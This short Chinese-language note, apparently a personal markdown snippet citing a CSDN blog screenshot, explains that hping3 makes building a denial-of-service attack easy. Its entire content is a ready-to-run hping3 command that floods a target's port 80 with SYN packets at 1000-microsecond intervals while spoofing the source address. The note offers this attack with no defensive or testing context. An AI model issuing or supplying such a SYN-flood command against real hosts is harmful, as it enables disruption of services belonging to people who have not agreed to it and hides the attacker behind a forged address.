#ss


使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。
```
hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
```
![](/pics/screencapture-blog-csdn-net-freeking101-article-details-72582964-2020-09-10-14_00_51.png)